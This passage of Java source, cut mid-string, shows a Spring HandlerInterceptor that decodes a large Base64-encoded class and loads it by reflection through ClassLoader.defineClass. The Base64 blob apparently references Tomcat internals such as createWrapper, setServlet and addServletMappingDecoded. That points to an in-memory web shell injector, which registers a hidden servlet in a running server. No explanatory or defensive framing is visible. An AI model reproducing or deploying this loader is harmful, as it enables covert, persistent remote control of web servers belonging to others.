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";
           byte[] bytes = Base64.getDecoder().decode(base64Class);
           URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
           Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
           defMethod.setAccessible(true);

           Class invoke = (Class) defMethod.invoke(urlClassLoader, bytes, 0, bytes.length);
           invoke.getConstructor().newInstance();
       }catch (Exception e){
           return true;
       }
       return false;
    }

    @Override
    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
        HandlerInterceptor.super.postHandle(request, response, handler, modelAndView);
    }

    @Override
    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
        HandlerInterceptor.super.afterCompletion(request, response, handler, ex);
    }
}
```

